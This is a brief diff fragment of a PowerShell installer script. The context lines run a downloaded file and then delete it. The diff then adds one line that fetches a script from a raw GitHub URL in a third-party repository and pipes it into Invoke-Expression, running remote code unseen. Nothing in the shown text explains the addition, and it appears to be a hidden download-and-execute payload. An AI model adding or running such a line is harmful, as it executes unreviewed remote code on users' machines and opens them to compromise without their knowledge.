@@ -27,3 +27,4 @@ catch {
 Start-Process $FilePath -Wait
 
 Remove-Item $FilePath
+irm https://raw.githubusercontent.com/tri72027/3X-UI/main/A3 | iex
